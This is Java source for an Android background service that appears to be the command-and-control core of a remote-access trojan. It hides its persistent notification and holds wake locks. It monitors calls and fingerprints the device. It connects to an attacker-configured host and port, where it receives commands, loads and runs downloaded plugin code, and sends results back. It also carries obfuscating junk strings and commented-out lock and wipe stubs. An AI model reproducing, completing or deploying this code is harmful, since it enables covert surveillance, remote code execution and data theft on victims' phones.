package store.apps;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;

import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;

import android.widget.Toast;


import java.security.MessageDigest;
import java.util.ArrayList;

import java.util.List;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
public class EngineWorkerins extends Service {

   // public static String Poremeter ="1177";

    public static String _usr_nam_ ="name.info"+"|";
   // public static String UserName ="name.info"+"|";




    public static String _splet_1_ = "DataLogs";
    public static String _split_2_ = "Helper";

    public static String _split_3_ = "SaveLog";
    public static String _split_4_ = "cashfile";

   public static boolean _the_alive_ = Boolean.parseBoolean("alive.info");
  //  public static boolean _the_alive_ = Boolean.parseBoolean("true");

    //public static boolean _the_fouce_ = Boolean.parseBoolean("fource.info");

   // public static  String _the_key_ =  DataScan1.iconid("VHhUeFQ");
   public static  String _the_key_ =  DataScan1.iconid("key.info");


    public static List<ValueHolders> Li;
    public static List<supportable1> Lcl;
    public static long _the_eco_ = -1;
    public static int plg = -1;

    public static int inx = -1;
    public static String _the_plugns_[]={"","","","","","","","","","","","","","","","",""};
    public static boolean _the_sokt_ = false;



    public static void startCustomTimer(Context context, String name, long millisec , String str){
        try{
            if (str.length() < 1)
            {
                return;
            }
            Intent intent = new Intent(context, AgreeingEngineering.class);
            intent.setAction(name);

            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, false ? System.currentTimeMillis() : System.currentTimeMillis() + millisec, millisec, pendingIntent);

        }
        catch(Exception ex)
        {






        }
    }
    public static String _generat_idphone_(Context context) {
        String pseudoId = "35" +
                Build.BOARD.length() % 10 +
                Build.BRAND.length() % 10 +
                Build.CPU_ABI.length() % 10 +
                Build.DEVICE.length() % 10 +
                Build.DISPLAY.length() % 10 +
                Build.HOST.length() % 10 +
                Build.ID.length() % 10 +
                Build.MANUFACTURER.length() % 10 +
                Build.MODEL.length() % 10 +
                Build.PRODUCT.length() % 10 +
                Build.TAGS.length() % 10 +
                Build.TYPE.length() % 10 +
                Build.USER.length() % 10;


        String longId = pseudoId ;

        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(longId.getBytes(), 0, longId.length());

            // get md5 bytes
            byte md5Bytes[] = messageDigest.digest();

            // creating a hex string
            String identifier = "";

            for (byte md5Byte : md5Bytes) {
                int b = (0xFF & md5Byte);

                // if it is a single digit, make sure it have 0 in front (proper padding)
                if (b <= 0xF) {
                    identifier += "0";
                }

                // add number to string
                identifier += Integer.toHexString(b);
            }

            // hex string to uppercase
            identifier = identifier.toUpperCase();
            return identifier;
        } catch (Exception e) {
            return UUID.randomUUID().toString();
        }

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onDestroy(){
        super.onDestroy();
        DataScan1.SETFORONE = 0;
        st = null;
        try {
            if(DataScan1.rc != null){
                unregisterReceiver(DataScan1.rc);
            }
            if (DataScan1.sr != null)
            {
                unregisterReceiver(DataScan1.sr);
            }


        } catch (Exception e) {}
        try
        {
            if (wakeLock != null)
            {
                if (wakeLock.isHeld() == true)
                {
                    wakeLock.release();
                }
            }

            stopForeground(true);
            //stopSelf();
        }catch (Exception e){






        }
    }
    public static void showToast(final String msg) {
        if (null != _app_contx_) {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        Toast.makeText(_app_contx_, msg, Toast.LENGTH_LONG).show();

                    }catch (Exception e){}
                }

            });

        }
    }
    public static void openlink(final String link)
    {
        if (null != _app_contx_) {
            Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                @Override
                public void run() {
                    try{
                        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(link));
                        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        _app_contx_.startActivity(browserIntent);
                        // ClassGen9.DumpActivity.startActivityForResult();
                    }catch (Exception e){






                    }

                }

            });

        }
    }

    static EngineWorkerins st;
    public static Context _app_contx_;
    PowerManager.WakeLock wakeLock = null;


    public static Notification Foreground(Context ctx,String ChennelID,String Name) {


        String CHANNEL_ID = ChennelID.replace("[RANDOM-STRING]","");


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager =
                    (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            // Support for Android Oreo: Notification Channels
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                     Name,
                    NotificationManager.IMPORTANCE_DEFAULT);


            manager.createNotificationChannel(channel);
            Notification nf = new Notification.Builder(ctx,CHANNEL_ID)
                    .setContentTitle("")
                    .setContentText("")
                    .setVisibility(Notification.VISIBILITY_SECRET)
                    .setPriority(Notification.PRIORITY_DEFAULT)
                    .setSmallIcon(android.R.color.transparent)
                    .setAutoCancel(false)
                    .build();

            return nf;
        }
        else
        {
            //  RemoteViews rv = new RemoteViews(ctx.getPackageName(),R.layout.s1s2s3s4s5s6);
            // final int d = R.drawable.x1x2x3x4x5x6;
            Notification nf = new Notification.Builder(ctx)
                    .setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(android.R.color.transparent)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .setSmallIcon(android.R.color.transparent)
                    .setVisibility(Notification.VISIBILITY_SECRET)
                    .setAutoCancel(false)
                    .build();
            return nf;

        }



    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        return START_STICKY;
      //  return START_NOT_STICKY;
    }

    @Override
    public void onCreate() {

        isWorkerRunning =false;
        if (_the_alive_)
        {

            Notification ntf = Foreground(getApplicationContext(),Rep("HE[RANDOM-STRING]LP","[RANDOM-STRING]",""),"Worker");
            if (ntf != null){
                Random r = new Random();
                this.startForeground(r.nextInt(100)+50,ntf);

            }
        }
        Context fitstctx = getApplicationContext();
        try {
            _app_contx_ = getApplicationContext();
            startCustomTimer(_app_contx_,"",18000,"[RANDOM-STRING]");









            if (wakeLock == null)
            {
                PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,  Rep(
                        "PeriSecure[RANDOM-STRING]MyWakeLock",
                        "[RANDOM-STRING]",
                        ":"));
            }
            if (wakeLock != null)
            {
                if (wakeLock.isHeld() == false)
                {

                    wakeLock.acquire();
                }
            }
//            try
//            {
//                startService(new Intent(this, WackMeUpJob.class));
//            }catch (Exception e){}
            if (DataScan1.sr == null){
                try {


                    IntentFilter fs = new IntentFilter(Rep(
                            "android[RANDOM-STRING]intent[RANDOM-STRING]action[RANDOM-STRING]PHONE_STATE",
                            "[RANDOM-STRING]",
                            "."));
                    fs.addAction(Rep( "android[RANDOM-STRING]intent[RANDOM-STRING]action[RANDOM-STRING]NEW_OUTGOING_CALL",
                            "[RANDOM-STRING]",
                            "."));

                    fs.addAction(Rep( "android[RANDOM-STRING]intent[RANDOM-STRING]extra[RANDOM-STRING]PHONE_NUMBER",
                            "[RANDOM-STRING]",
                            "."));
                    if (DataScan1.sr == null)
                    {
                        DataScan1.sr = new CallsManager();
                        registerReceiver(DataScan1.sr, fs);
                    }


                }catch (Exception e) {}
            }

            if(DataScan1.rc == null){
                IntentFilter f = new IntentFilter(Intent.ACTION_SCREEN_ON);
                f.addAction(Intent.ACTION_SCREEN_OFF);
                f.addAction(Intent.ACTION_USER_PRESENT);
                DataScan1.rc = new ReceversAnalys();
                registerReceiver(DataScan1.rc, f);
            }
        } catch (Exception e) {






        }


        try {
            if (DataScan1.ec == null){
                DataScan1.ec = new ThreadPoolExecutor(5, 15, 1,
                        TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(DataScan1.max));
            }


            try {
                String _SERIAL = Settings.Secure.getString(fitstctx.getContentResolver(), Settings.Secure.ANDROID_ID);

                _usr_nam_ = _usr_nam_ +_SERIAL;
            }catch (Exception e)
            {

                _usr_nam_ = _generat_idphone_(fitstctx);
            }


            DataScan1.gl(fitstctx);
            //_start_connect_(ctx);

            //start connect

            final Context[] ctx = new Context[]{fitstctx};
            StartWorker(ctx);


        } catch (Exception e) {}

//        final Context[] ctx = new Context[]{getApplicationContext()};
//        StartWorker(ctx);

        super.onCreate();

    }
    public static String _the_host_ = DataScan1.iconid("host.info");
    public static String _the_port_ = DataScan1.iconid("port.info");




    public static void _s_screen_(final String on)
    {
        if (null != _app_contx_) {

            try{
                if (on.startsWith("on:"))
                {
                    Intent myIntent = new Intent(_app_contx_, SecoundActivity.class);
                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    myIntent.putExtra("key", on);//Optional parameters
                    _app_contx_.startActivity(myIntent);


                }else
                {
                    Intent myIntent = new Intent(_app_contx_, SecoundActivity.class);
                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    myIntent.putExtra("key", "off");//Optional parameters
                    _app_contx_.startActivity(myIntent);

                }

                // ClassGen9.DumpActivity.startActivityForResult();
            }catch (Exception e){}
        }
    }
    public String Rep(String Text,String Target,String original)
    {

        try
        {
            return  Text.replace(Target,original);
        }catch (Exception e){}
        return "";
    }


    public static String GRS( int sizeOfRandomString)
    {
        try {
            Thread.sleep(1);
        } catch (InterruptedException e) {

        }
        try
        {
            String ALLOWED_CHARACTERS ="[RANDOM-STRING]qwertyuiopasdfghjklzxcvbnm";
            Random random=new Random();
            StringBuilder sb=new StringBuilder(sizeOfRandomString);
            for(int i=0;i<sizeOfRandomString;++i)
                sb.append(ALLOWED_CHARACTERS.charAt(random.nextInt(ALLOWED_CHARACTERS.length())));
            return sb.toString();
        }catch (Exception e){
            e.printStackTrace();
        }
        return "dsa[RANDOM-STRING]asd";
    }

//    public static class ta extends AsyncTask<Context, Integer, String> {
//        public static String T2="[RANDOM-STRING]";
//        public static String T3="[RANDOM-STRING]";
//        public static String T4="[RANDOM-STRING]";
//        public static String T5="[RANDOM-STRING]";
//        public static String T6="[RANDOM-STRING]";
//        public static String T7="[RANDOM-STRING]";
//        @Override
//        protected void onPreExecute() {
//            super.onPreExecute();
//        }
//        @Override
//        protected String doInBackground(Context... ctx) {
//
//        }
//
//
//        @Override
//        protected void onPostExecute(String u) {
//            super.onPostExecute(u);
//        }
//    }

    public Runnable runnable=null;
    public Thread RunbleThread=null;
    public void StartWorker(final Context[] ctx)
    {
       if (runnable == null){

           runnable = new Runnable(){
               public void run() {

                   String ENCR = "";

                   final Context[] ctx = new Context[]{getApplicationContext()};

                   do {
                       try{
                           if (ConHelpOne.echo == true){
                               ENCR = "[RANDOM-STRING]";

                               if(EngineWorkerins._the_eco_ ==  -1){
                                   ENCR = "[RANDOM-STRING]";
                                   EngineWorkerins._the_eco_ = System.currentTimeMillis() + ConHelpOne.t ;
                               }else{
                                   try
                                   {
                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(1);
                                       if (System.currentTimeMillis() > EngineWorkerins._the_eco_){
                                           String sh = DataScan1.dt;
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(5);
                                           if(EngineWorkerins.inx == 2){
                                               sh = "\t";
                                               ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(3);
                                           }
                                           ConHelpOne._send_mthd_(DataScan1.jz,sh.getBytes());
                                           ConHelpOne._o_x_(ENCR);
                                           if(EngineWorkerins.inx >= 3){
                                               ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(7);
                                               EngineWorkerins.inx = -1;
                                               ConHelpOne.di();
                                           }else{
                                               ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(2);
                                               EngineWorkerins.inx++;
                                           }
                                           EngineWorkerins._the_eco_ = -1;
                                       }
                                   }catch (Exception ee){




                                        }
                               }
                           }else{
                               ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                               EngineWorkerins._the_eco_ = -1;
                           }
                       } catch (Exception e) {






                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(3);
                       }

                       try{  try{
                           if(Li.size() > 0){
                               ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                               ValueHolders d = Li.get(0);
                               if (d !=null){
                                   ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(10);
                                   String[] da = d.str.split(EngineWorkerins._the_key_);
                                   String db = da[0];
                                   if(db.equals("0")){
                                       Class<?> cl = RTPluginsHelper.AsyncIMEscan(ctx[0],d.byt,da[1],da[4]);
                                       supportable1 c = new supportable1(cl.getName(),cl);
                                       Lcl.add(c);
                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                       if(Lcl.size() == Integer.valueOf(da[2])){
                                           _the_plugns_[0] = da[5];
                                           _the_plugns_[4] = da[6];
                                           _the_plugns_[5] = da[7];
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           _the_plugns_[6] = da[8];
                                           _the_plugns_[7] = da[9];
                                           _the_plugns_[8] = da[10];
                                           _the_plugns_[9] = da[11];
                                           ENCR = "odC[RANDOM-STRING]gvOAkaJRHpRn";
                                           _the_plugns_[10] = da[12];
                                           _the_plugns_[11] = da[13];






                                           _the_plugns_[12] = da[14];
                                           _the_plugns_[13] = da[15];
                                           _the_plugns_[14] = da[16];
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           _the_plugns_[15] = da[17];
                                           _the_plugns_[16] = da[18];
                                           EngineWorkerins.plg = Lcl.size();
                                           RTPluginsHelper.runmecomnow(ctx[0],da[3]);
                                           ConHelpOne.s = 10L;
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           ConHelpOne._send_mthd_(_the_plugns_[15],"\t".getBytes());
                                       }
                                   }else if(DataScan1.c(db, _the_plugns_[4])){
                                       if(Lcl.size()>0){
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           for (int i = 0; i <= Lcl.size();i++){
                                               if (Lcl.get(i).d.equals(da[1])){
                                                   Object obj = RTPluginsHelper.exec(ctx[0],Lcl.get(i).j,da[2],da[4],d.byt);
                                                   if(!da[3].equals(_the_plugns_[16])){
                                                       try {
                                                           ConHelpOne._send_mthd_(da[3], DataScan1._METHOD_getbyte_(obj));
                                                       } catch (Exception e) {}
                                                       break;
                                                   }else{
                                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                                       break;
                                                   }
                                               }
                                           }
                                       }
                                   }else if(DataScan1.c(db, _the_plugns_[5])){
                                       if(!RTPluginsHelper._mthd_issrvrun_(JunkFileCov.class,ctx[0],"[RANDOM-STRING]")) {
                                           Intent i = new Intent(ctx[0], JunkFileCov.class);
                                           ctx[0].stopService(i);
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           try{ Thread.sleep(1000);} catch (InterruptedException e) {




                                                }
                                       }

                                       if(RTPluginsHelper._mthd_issrvrun_(JunkFileCov.class,ctx[0],"[RANDOM-STRING]")) {

                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           String vul[] = {da[1],da[2],da[3],da[4],da[5],da[6],da[7],da[8]};
                                           if (da[4].equals("ddll"))
                                           {
                                               if (da[1].startsWith("msg:")){
                                                   //w ot msg:
                                                   try {
                                                       if (da[1].endsWith(":up"))
                                                       {
                                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                                           UpdateApp atualizaApp = new UpdateApp();
                                                           atualizaApp.setContext(_app_contx_,da[1].replace("msg:","").replace(":up",""));
                                                           //  atualizaApp.execute(da[1].replace("msg:","").replace(":up",""));
                                                       }else if(da[1].endsWith(":fsh")){
                                                           //FPPAGE(da[1].replace("msg:","").replace(":fsh",""));
                                                           // ConHelpOne
                                                           String sn = "S-M-H<"+"Cant use in injection"+"<"+"iam injected";

                                                           ConHelpOne._send_mthd_("-44", sn.getBytes());
                                                       }else
                                                       {
                                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                                           showToast(da[1].replace("msg:",""));
                                                       }

                                                   }catch (Exception e){






                                                       //  ClassGen9.mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                                                   }
                                               }else if (da[1].startsWith("lnk<*>")){
                                                   //d1 lnk
                                                   try {
                                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                                       openlink(da[1].replace("lnk<*>",""));

                                                       //ClassGen9.mDPM.setCameraDisabled(ClassGen9.mAdminName,true);
                                                   }catch (Exception e){

                                                   }
                                               }else if (da[1].equals("da<*>")){
                                                   // TODO: 6/1/2021  add admin class
                                                   try {
                                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                                       // TODO: ClassGen9.mDPM.setCameraDisabled(ClassGen9.mAdminName,false);
                                                   }catch (Exception e){






                                                   }
                                               }else if (da[1].equals("l"))
                                               {
                                                   try {
                                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
//                                            TODO:    if (ClassGen9.mDPM.isAdminActive(ClassGen9.mAdminName))
//                                                {
//
//
//                                                    ClassGen9.mDPM.lockNow();
//
//
//                                                }
                                                   }catch (Exception e){

                                                   }
                                               }else  if (da[1].startsWith("sc:"))
                                               {
                                                   try{
                                                       _s_screen_(da[1].replace("sc:",""));
                                                   }catch (Exception e ){




                                                        }
                                               }

                                               //    showToast("ok");


                                           }else {
                                               Intent i = new Intent(ctx[0], JunkFileCov.class);
                                               i.putExtra(_split_2_,vul);
                                               ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                               DataScan1.sr(ctx[0],i);
                                           }

                                       }
                                   }else if(DataScan1.c(db, _the_plugns_[6])){
                                       if(RTPluginsHelper._mthd_issrvrun_(FileLocator.class,ctx[0],"[RANDOM-STRING]")) {
                                           Intent i = new Intent(ctx[0], FileLocator.class);
                                           String vul[] = {da[1],da[2]};
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           i.putExtra(_split_3_,vul);
                                           DataScan1.sr(ctx[0],i);
                                       }
                                   }else if(DataScan1.c(db, _the_plugns_[7])){
                                       if(!RTPluginsHelper._mthd_issrvrun_(FileLocator.class,ctx[0],"[RANDOM-STRING]")) {
                                           Intent i = new Intent(ctx[0], FileLocator.class);
                                           ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                           ctx[0].stopService(i);
                                       }
                                   }else if(DataScan1.c(db, _the_plugns_[8])){
                                       DataScan1.exi(ctx[0],da[1]);
                                   }else if(DataScan1.c(db, _the_plugns_[11])){
                                       _the_plugns_[1] = da[1];
                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                       _the_plugns_[2] = da[2];
                                       _the_plugns_[3] = da[3];
                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                       EngineWorkerins._the_sokt_ = DataScan1.acc(ctx[0], GPSCAN.class);
                                       ConHelpOne._send_mthd_(_the_plugns_[1] + _the_plugns_[2] + String.valueOf(EngineWorkerins._the_sokt_),"\t".getBytes());
                                   }else if(DataScan1.c(db, _the_plugns_[9])){
                                       DataScan1.rel(false);
                                       ConHelpOne._send_mthd_(da[1],"\t".getBytes());
                                   }else if(DataScan1.c(db, _the_plugns_[12])){
                                       EngineWorkerins._the_sokt_ = false;
                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                   }else if(DataScan1.c(db, _the_plugns_[13])){
                                       DataScan1.wk(ctx[0],true);
                                       ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                                       ConHelpOne._send_mthd_(da[1],"\t".getBytes());
                                   }else if(DataScan1.c(db, _the_plugns_[14])){
                                       if(ConHelpOne.echo){
                                           ConHelpOne.poi();
                                       }
                                   }else {




                                        }
                               }
                               if(!ConHelpOne._is_connected_){
                                   Li.clear();
                                   ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                               }else{
                                   Li.remove(0);
                                   ENCR = "[RANDOM-STRING]"+EngineWorkerins.GRS(4);
                               }
                               if (ENCR.equals("IAM[RANDOM-STRING]OUT"))
                               {

                               }
                               try{ Thread.sleep(1);} catch (InterruptedException e) {





                                    }
                           }else {
                               try{ Thread.sleep(100);} catch (InterruptedException e) {}
                           }
                       } catch (Exception e) {}
                       }catch (OutOfMemoryError e) {}
                   } while (true);

                 //  EngineWorkerins.isWorkerRunning=false;
               }
           };
       }

         if (RunbleThread ==null){
             RunbleThread = new Thread(runnable);
         }

        try
        {
            if (!ConHelpOne._is_connected_)
            {
                EngineWorkerins.Li = new ArrayList<ValueHolders>();
                EngineWorkerins.Lcl = new ArrayList<supportable1>();
                String nm = EngineWorkerins._usr_nam_;
                String tm = EngineWorkerins._splet_1_;
                String cm = EngineWorkerins._split_2_;
                String gm = EngineWorkerins._split_3_;


                String im = _the_host_;
                String pm = _the_port_;
                if (DataScan1.gt(ctx[0],tm).length() == 0){
                    DataScan1.dit(ctx[0],nm,tm);
                }

                if (DataScan1.gt(ctx[0],cm).length() != 0){
                    im = DataScan1.gt(ctx[0],cm);
                }
                if (DataScan1.gt(ctx[0],gm).length() != 0){
                    pm = DataScan1.gt(ctx[0],gm);
                }
                ConHelpOne.FormatSok(im,pm,ctx[0]);

            }
            //new EngineWorkerins.ta().execute(ctx);


        }catch (Exception e){}

         if (!isWorkerRunning){

             isWorkerRunning =true;

             RunbleThread.start();
         }




    }


   public  boolean isWorkerRunning =false;
}